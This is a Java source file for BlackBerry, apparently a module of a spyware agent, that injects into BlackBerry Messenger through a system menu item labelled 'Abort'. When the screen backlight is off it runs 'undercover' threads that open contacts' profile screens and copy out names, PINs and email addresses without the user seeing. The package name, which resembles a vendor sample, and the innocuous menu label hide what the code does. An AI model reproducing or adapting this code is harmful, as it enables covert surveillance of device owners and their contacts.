//#preprocess
package com.rim.samples.device.bbminjectdemo;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.EventLogger;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;

public class BBMMenuItem extends ApplicationMenuItem {

    private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);

    private static BBMMenuItem instance;

    UiApplication bbmApplication;
    Screen contactsScreen;
    // Vector conversationScreens = new Vector();

    Hashtable users = new Hashtable();
    Hashtable userConversations = new Hashtable();

    boolean bbmInjected = false;

    // int numContacts;
    // int numEmails;

    static BBMMenuItem getInstance() {
        if (instance == null)
            instance = new BBMMenuItem(0);

        return instance;
    }

    public BBMMenuItem(int arg0) {
        super(arg0);

        undercover = !Backlight.isEnabled();
        lookForConversationsThread();

    }

    Vector contacts = new Vector();
    Thread t = null;
    boolean undercover = false;
    ConversationScreen conversationScreen;

    public void lookForConversationsThread() {

        if (t != null) {
            return;
        }
        conversationScreen = new ConversationScreen();
        t = new Thread(conversationScreen);

        t.start();

    }

    public Object run(Object context) {
        try {
            debug.info("BBMMenuItem context: " + context);
            UiApplication app = UiApplication.getUiApplication();
            Class cl = app.getClass();

            debug.trace("class: " + cl);

            Screen screen = UiApplication.getUiApplication().getActiveScreen();

            debug.trace("screen: " + screen + " count: "
                    + screen.getUiEngine().getScreenCount());

            debug.startBuffering(EventLogger.INFORMATION);
            if (screen.getClass().getName().indexOf("BBMContactsScreen") > 0) {
                contacts.removeAllElements();

                contactsScreen = screen;
                bbmInjected = true;

                bbmApplication = UiApplication.getUiApplication();
                // lookForConversationsThread();
                conversationScreen.setBBM(bbmApplication);

                FieldExplorer explorer = new FieldExplorer();
                contacts = explorer.explore(screen);

                screen.close();

                //#ifdef DEBUG
                debug.info("BBM INJECTED!");
                //debug.(Debug.COLOR_GREEN);
                //#endif
            } else {
                //#ifdef DEBUG
                debug.warn("BBM NOT INJECTED!");
                debug.led(Debug.COLOR_RED);
                //#endif
            }

            debug.stopBuffering();

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.warn("injectBBM:" + ex.toString());
            debug.led(Debug.COLOR_RED);
            //#endif
        }
        return null;
    }

    private synchronized boolean extractProfile(Screen screen) {
        debug.trace("extractProfile");
        debug.trace("  local active screen: "
                + UiApplication.getUiApplication().getActiveScreen());

        try {
            if (MenuWalker.walk("View Contact Profile", screen, true)
                    || MenuWalker.walk("Contact Profile", screen, true)) {
                Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);

                debug.info("wolked in Contact Profile");
                Utils.sleep(100);
                Screen newScreen = UiApplication.getUiApplication()
                        .getActiveScreen();

                if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
                    debug.trace("no Contact Profile: " + newScreen);
                    return false;
                }
                // Ocio che gli schermi aperti vengono agganciati a
                // UiApplication!
                // debug.trace("  active screen: " + newScreen);
                // debug.trace("  local active screen: "
                // + UiApplication.getUiApplication().getActiveScreen());

                debug.trace("exploring Contact Profile: " + newScreen);

                FieldExplorer explorer = new FieldExplorer();
                Vector textfields = explorer.explore(newScreen);

                if (textfields.size() == 2 || textfields.size() == 3) {
                    String user = (String) textfields.elementAt(0);
                    String pin = (String) textfields.elementAt(1);
                    String email = "";

                    debug.info("User: " + user);
                    debug.info("PIN: " + pin);

                    if (textfields.size() == 3) {
                        email = (String) textfields.elementAt(2);
                        debug.info("Email: " + email);
                    }

                    users.put(user.toLowerCase(), new User(user, pin, email));

                    //#ifdef DEBUG
                    debug.led(Debug.COLOR_ORANGE);
                    //#endif
                }

                debug.trace("closing Contact Profile");
                newScreen.close();
            } else {
                debug.info("");
            }

        } catch (Exception ex) {
            debug.stopBuffering();
            debug.error(ex.toString());
            return false;
        }
        return true;
    }

    public String toString() {
        return BBM_MENU;
    }

    Thread ucThread;

    public void underCoverJobs() {

        debug.info("Under cover");
        undercover = true;

        if (ucThread != null) {
            return;
        }

        if (!bbmInjected) {
            return;
        }

        ucThread = new Thread(new Runnable() {

            public void run() {

                for (int i = 0; i < conversationScreen.size(); i++) {
                    final Screen screen = conversationScreen.elementAt(i);

                    bbmApplication.invokeLater(new Runnable() {

                        public void run() {
                            debug.trace("run, extracting profile from: "
                                    + screen);
                            extractProfile(screen);
                        }

                    });

                    Utils.sleep(500);

                }
            }

        });

        ucThread.start();

    }

    public void stopUnderCoverJobs() {
        debug.info("Stop Under cover");
        undercover = false;

        // if (ucThread != null) {
        // ucThread.interrupt();
        // }

        ucThread = null;

    }

    public void addMenuBBM() {
        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
        // long bbmid = 4470559380030396000L; Non funziona
        // long bbmid = 5028374280894129973L; Non funziona
        // long bbmid = 7084794250801777300L;
        ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
    }

    public void removeMenuBBM() {
        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
        ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
    }

    private static final String BBM_MENU = "Abort";

    public static char getKey() {
        return 'a';
    }

    public boolean isInjected() {
        debug.info("injected: " + bbmInjected);
        return bbmInjected;
    }

}
